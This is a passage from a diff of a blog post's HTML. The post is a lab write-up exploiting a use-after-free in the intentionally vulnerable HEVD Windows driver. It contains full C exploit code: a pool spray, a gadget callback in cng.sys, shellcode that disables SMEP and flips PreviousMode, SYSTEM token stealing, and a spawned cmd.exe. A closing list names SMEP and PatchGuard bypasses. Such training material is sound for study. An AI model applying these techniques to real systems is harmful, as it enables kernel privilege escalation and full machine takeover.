+</span></span><span class="line"><span class="cl">        <span class="nf">pNtRead</span><span class="p">(</span><span class="nf">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">nextProcessLink</span> <span class="o">+</span> <span class="n">OFFSET_EPROCESS_LINKS</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">nextProcessLink</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nextProcessLink</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">nextProcessLink</span> <span class="o">-</span> <span class="n">OFFSET_EPROCESS_LINKS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">myEprocessAddr</span> <span class="o">&amp;&amp;</span> <span class="n">systemToken</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">pNtWrite</span><span class="p">(</span><span class="nf">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">myEprocessAddr</span> <span class="o">+</span> <span class="n">OFFSET_EPROCESS_TOKEN</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">systemToken</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Token overwrited</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>ExploitUAF<span class="hx-absolute -hx-mt-20" id="exploituaf"></span>
+    <a href="#exploituaf" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>The main function, where the driver is exploited to be able to execute the shellcode we want.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ExploitUAF</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hFile</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">sc</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">scSize</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FAKE_OBJECT_NON_PAGED_POOL</span> <span class="n">fakeObj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fakeObj</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fakeObj</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONGLONG</span> <span class="n">cngBase</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;cng.sys&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fakeObj</span><span class="p">.</span><span class="n">Callback</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">cngBase</span> <span class="o">+</span> <span class="mh">0x0c7e1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] leaked cng.sys base @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cngBase</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Gadget address @ 0x%016llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">cngBase</span> <span class="o">+</span> <span class="mh">0x0c7e1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">fakeObj</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">scSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Freeing UAF Object... (Security)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating UAF Object...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Freeing UAF Object...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Dangling pointer live</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Spraying %d fake objects...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&amp;</span><span class="n">fakeObj</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fakeObj</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Spray done</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>main<span class="hx-absolute -hx-mt-20" id="main"></span>
+    <a href="#main" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>I would describe it as the wrapper, where all is called in order to successfully execute the exploit.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver handle: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sc_privs</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x0F\x20\xE0\x48\x25\xFF\xFF\xEF\xFF\x0F\x22\xE0\x65\x48\x8B\x04\x25\x88\x01\x00\x00\xC6\x80\x32\x02\x00\x00\x00\x48\x31\xC0\x48\x83\xC4\x08\xC3</span><span class="s">&#34;</span><span class="p">;</span> <span class="c1">// 8 x \x90
+</span></span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">sc_restore</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x0F\x20\xE0\x48\x0D\x00\x00\x10\x00\x0F\x22\xE0\x65\x48\x8B\x04\x25\x88\x01\x00\x00\xC6\x80\x32\x02\x00\x00\x01\x48\x31\xC0\x48\x83\xC4\x08\xC3</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Phase 1: PreviousMode = 0...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ExploitUAF</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">sc_privs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc_privs</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Exploit
+</span></span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">ntosBase</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;ntoskrnl.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">systemEprocessPtr</span> <span class="o">=</span> <span class="nf">GetSymbolAddr</span><span class="p">(</span><span class="n">ntosBase</span><span class="p">,</span> <span class="s">&#34;PsInitialSystemProcess&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">systemEprocess</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="nf">GetModuleHandleA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_NtReadVirtualMemory</span> <span class="n">pNtRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtReadVirtualMemory</span><span class="p">)</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">&#34;NtReadVirtualMemory&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pNtRead</span><span class="p">(</span><span class="nf">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">systemEprocessPtr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">systemEprocess</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">PerformTokenStealing</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">systemEprocess</span><span class="p">,</span> <span class="nf">GetCurrentProcessId</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Phase 2: PreviousMode = 1...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ExploitUAF</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">sc_restore</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc_restore</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
 <h2>Conclusion<span class="hx-absolute -hx-mt-20" id="conclusion"></span>
-    <a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Writing&hellip; (I will be finished)</p>
+    <a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>This is not the typically writeup of use-after-free in HEVD, but after learning a lot of new cool stuff related with windows internals, I recommend all of windows enthusiast to try it out.</p>
+<p>I wanted also to list what I have learned, maybe someone while reading this concepts get the enought motivation to learn windows kernel, and do a little bit of kernel freestylee!</p>
+<ul>
+<li>Supervisor Monitoring Execution Protection (SMEP) Bypass</li>
+<li>Kernel Patch Protections (KPP/PatchGuard) Bypass</li>
+<li>GS Cookie / Stack Alignment</li>
+<li>Shellcode development and debuggin</li>
+<li>Simulating Lazarus Rootkit: Admin-to-Kernel Zero-Day</li>
+<li>Stack Pivot</li>
+<li>FengShui / Heap grooming method</li>
+</ul>
+<p>I really hope you enjoy this post, contact me if you have any question!</p>
 <h3>Resources<span class="hx-absolute -hx-mt-20" id="resources"></span>
     <a href="#resources" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><ul>
 <li><a href="https://m2rc.net/posts/hevd-useafterfree/" target="_blank" rel="noopener">https://m2rc.net/posts/hevd-useafterfree/</a></li>
@@ -1342,6 +1837,8 @@
 <li><a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/" target="_blank" rel="noopener">https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/</a></li>
 <li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/" target="_blank" rel="noopener">https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/</a></li>
 <li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/</a></li>
+<li><a href="https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day" target="_blank" rel="noopener">https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day</a></li>
+<li><a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xc2--bad-pool-caller" target="_blank" rel="noopener">https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xc2--bad-pool-caller</a></li>
 </ul>
 
         </div><div class="hx-mt-16"></div><div class="hx-mb-8 hx-flex hx-items-center hx-border-t hx-pt-8 dark:hx-border-neutral-800 contrast-more:hx-border-neutral-400 dark:contrast-more:hx-border-neutral-400 print:hx-hidden"><a
